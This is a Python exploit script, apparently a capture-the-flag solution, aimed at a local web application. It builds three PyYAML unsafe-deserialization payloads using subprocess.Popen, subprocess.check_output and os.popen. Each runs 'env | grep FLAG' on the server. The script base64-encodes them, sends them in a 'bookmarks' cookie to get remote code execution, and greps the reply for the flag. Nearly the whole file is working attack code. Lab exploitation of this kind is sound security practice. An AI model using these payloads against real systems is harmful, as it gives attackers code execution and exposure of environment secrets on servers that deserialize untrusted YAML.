import requests
import base64
import re

# Target URL
target_url = "http://127.0.0.1:8080/"

# Existing user cookie
user_cookie = "aea729d9fd8b4083b533db2c69e8e238"

# Craft YAML deserialization payload for RCE
# Using subprocess.Popen to execute command and capture output
# The payload will execute: env | grep FLAG
yaml_payload = """!!python/object/new:subprocess.Popen
- !!python/tuple
  - env
  - grep
  - FLAG
- stdin: !!python/name:subprocess.PIPE
  stdout: !!python/name:subprocess.PIPE
  stderr: !!python/name:subprocess.PIPE
"""

# Alternative payload using apply to directly get output
yaml_payload_v2 = """!!python/object/apply:subprocess.check_output
- !!python/tuple
  - !!python/tuple [sh, -c, 'env | grep FLAG']
"""

# Base64 encode the payload
encoded_payload = base64.b64encode(yaml_payload_v2.encode()).decode()

print(f"[*] Crafted YAML payload:")
print(yaml_payload_v2)
print(f"\n[*] Base64 encoded payload:")
print(encoded_payload)

# Set cookies with malicious payload
cookies = {
    'user': user_cookie,
    'bookmarks': encoded_payload
}

print(f"\n[*] Sending request with malicious bookmarks cookie...")
print(f"[*] Target: {target_url}")

try:
    # Send request with malicious cookie
    response = requests.get(target_url, cookies=cookies, timeout=10)
    
    print(f"\n[+] Response Status: {response.status_code}")
    print(f"[+] Response Headers: {dict(response.headers)}")
    print(f"[+] Response Length: {len(response.content)} bytes")
    print(f"\n[+] Full Response Body:")
    print(response.text)
    
    # Search for FLAG pattern in response
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"[!!! {flag_match.group(0)} !!!]")
    else:
        print(f"\n[-] No FLAG pattern found in response")
        
    # Also check for any error messages that might contain the flag
    if 'FLAG' in response.text:
        print(f"\n[*] Response contains 'FLAG' string - examining context:")
        lines = response.text.split('\n')
        for i, line in enumerate(lines):
            if 'FLAG' in line:
                print(f"  Line {i}: {line}")

except Exception as e:
    print(f"\n[!] Error: {type(e).__name__}: {e}")

# Try alternative payload formats
print("\n" + "="*80)
print("[*] Trying alternative payload with direct command execution...")
print("="*80)

# Try a simpler payload that might work better
yaml_payload_v3 = """!!python/object/apply:subprocess.check_output
args: [['sh', '-c', 'env | grep FLAG']]
"""

encoded_payload_v3 = base64.b64encode(yaml_payload_v3.encode()).decode()

print(f"\n[*] Alternative YAML payload:")
print(yaml_payload_v3)
print(f"\n[*] Base64 encoded:")
print(encoded_payload_v3)

cookies_v3 = {
    'user': user_cookie,
    'bookmarks': encoded_payload_v3
}

try:
    response_v3 = requests.get(target_url, cookies=cookies_v3, timeout=10)
    
    print(f"\n[+] Response Status: {response_v3.status_code}")
    print(f"[+] Full Response Body:")
    print(response_v3.text)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response_v3.text)
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"[!!! {flag_match.group(0)} !!!]")

except Exception as e:
    print(f"\n[!] Error: {type(e).__name__}: {e}")

# Try yet another approach - using os.popen
print("\n" + "="*80)
print("[*] Trying payload with os.popen...")
print("="*80)

yaml_payload_v4 = """!!python/object/apply:os.popen
args: ['env | grep FLAG']
"""

encoded_payload_v4 = base64.b64encode(yaml_payload_v4.encode()).decode()

print(f"\n[*] os.popen YAML payload:")
print(yaml_payload_v4)

cookies_v4 = {
    'user': user_cookie,
    'bookmarks': encoded_payload_v4
}

try:
    response_v4 = requests.get(target_url, cookies=cookies_v4, timeout=10)
    
    print(f"\n[+] Response Status: {response_v4.status_code}")
    print(f"[+] Full Response Body:")
    print(response_v4.text)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response_v4.text)
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"[!!! {flag_match.group(0)} !!!]")

except Exception as e:
    print(f"\n[!] Error: {type(e).__name__}: {e}")

